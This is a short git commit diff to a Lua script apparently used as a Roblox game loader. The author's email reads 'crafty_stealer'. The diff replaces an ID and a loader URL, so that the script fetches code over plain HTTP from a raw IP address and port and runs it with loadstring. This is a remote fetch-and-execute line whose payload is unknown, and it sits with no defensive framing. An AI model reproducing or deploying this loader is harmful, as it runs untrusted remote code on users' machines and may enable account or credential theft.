9f2ef9e6b81900358950dc47256f6d060d17c7eb
veryimportantrr <crafty_stealer@proton.me>
2025-09-23 06:14:08 +0300

    Update gag.lua

--- games/gag.lua
+++ games/gag.lua
@@ -1,2 +1,2 @@
-ID="afae3183-230d-446a-a6c3-fca82a57ad33";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+ID="3d7154ef-c1bd-48f5-ab02-a1ba555444a0";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
